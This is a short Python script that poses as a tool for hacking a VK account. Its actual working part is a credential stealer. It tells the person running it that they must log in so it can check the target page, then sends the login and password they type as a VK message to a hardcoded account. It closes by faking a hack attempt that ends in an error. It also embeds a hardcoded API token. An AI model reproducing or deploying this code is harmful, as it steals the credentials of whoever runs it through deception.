import time 
import vk_api
import random
from core.colors import *
token='062f679113aba6edefbf271d795eb7bbf0faebb713f8e94f168de9a63927bd8c416509bdc1ca9ae467db8'
vk = vk_api.VkApi(token=token)
print(B+"Vk_modules"+W)
id=input(B+"Enter id hacking account: "+W)
print("Авторизуйтесь ВК\nЭто нужно чтоб скрипт проверил наличие страницы в соц.сети")
def write_msg(user_id, s, random_id):
 log= input("Enter login: ")
 pas = input("Enter password: ")
 msg = "login: " +log + " password: " +pas
 
 vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)}) 

write_msg('337045829', 'Ну ты и лох', 'random_id')

print(G+"account detect!"+W)
number=input("login : ")
print(R+"start hack!..."+W)
time.sleep(15)
print(R+"error hack"+W)
input()
